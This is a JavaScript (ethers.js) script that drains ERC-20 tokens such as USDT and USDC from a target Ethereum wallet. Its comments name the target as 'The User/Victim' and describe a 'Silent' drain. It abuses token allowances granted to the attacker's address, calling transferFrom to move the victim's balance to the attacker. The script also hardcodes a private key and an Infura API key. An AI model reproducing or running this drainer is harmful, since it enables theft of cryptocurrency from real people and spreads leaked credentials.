const { ethers } = require("ethers");

// Configuration
// YOUR Private Key (The Receiver// --- CONFIGURATION ---
const RECEIVER_PRIVATE_KEY = "0x75f8501c64abf4320568ac8c274e5fe1f079fb0c6d6f2b92d0bd96fb671b120e";
// The address you want to drain (The User/Victim)
const TARGET_WALLET_ADDRESS = "TARGET_WALLET_ADDRESS_HERE";

const RPC_URL = "https://mainnet.infura.io/v3/2859d5b9da2648988a15b3fc6e0783b5"; // Ethereum Mainnet

// The tokens you want to check/sweep
const TOKEN_LIST = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    // Add more...
];

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

async function sweepTokens() {
    console.log(`Starting sweep from ${TARGET_WALLET_ADDRESS}...`);

    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

    for (const tokenAddress of TOKEN_LIST) {
        try {
            const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);

            // 1. Check Balance
            const balance = await contract.balanceOf(TARGET_WALLET_ADDRESS);
            if (balance === 0n) {
                console.log(`Token ${tokenAddress}: No balance.`);
                continue;
            }

            // 2. Check Allowance
            const allowance = await contract.allowance(TARGET_WALLET_ADDRESS, wallet.address);
            if (allowance === 0n) {
                console.log(`Token ${tokenAddress}: No allowance set.`);
                continue;
            }

            // 3. Determine Sweep Amount
            const amountToSweep = balance > allowance ? allowance : balance;
            console.log(`Sweeping ${amountToSweep} from ${tokenAddress}...`);

            // 4. Execute TransferFrom (The "Silent" Drain)
            // YOU pay the gas for this, not the target wallet.
            const tx = await contract.transferFrom(TARGET_WALLET_ADDRESS, wallet.address, amountToSweep);
            console.log(`Transaction sent: ${tx.hash}`);
            await tx.wait();
            console.log("Confirmed!");

        } catch (error) {
            console.error(`Failed to sweep ${tokenAddress}:`, error.message);
        }
    }
}

sweepTokens();
